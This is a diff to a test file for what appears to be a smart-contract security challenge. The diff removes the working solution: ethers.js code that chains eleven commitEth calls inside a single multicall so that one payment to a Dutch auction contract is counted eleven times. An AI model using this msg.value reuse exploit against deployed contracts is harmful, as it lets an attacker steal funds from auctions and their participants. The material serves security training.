@@ -55,28 +55,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  await ethers.provider.send('evm_mine') // not necessary
-
-  let iface = new ethers.utils.Interface([
-    "function multicall(bytes[] data) payable",
-    "function commitEth(address _beneficiary) payable"
-  ])
-
-  let singleFunctionCall = iface.encodeFunctionData("commitEth", [
-    await attacker.getAddress()
-  ])
-
-  let chainedCalls = []
-  for (let i=0; i<11; i++) {
-    chainedCalls.push(singleFunctionCall)
-  }
-
-  let attackFunctionCall = iface.encodeFunctionData("multicall", [
-    chainedCalls
-  ])
-
-  await attacker.sendTransaction({to:dutchAuction.address, data:attackFunctionCall, value:precision.mul(98)})
-
 });
 
 /// expected final state
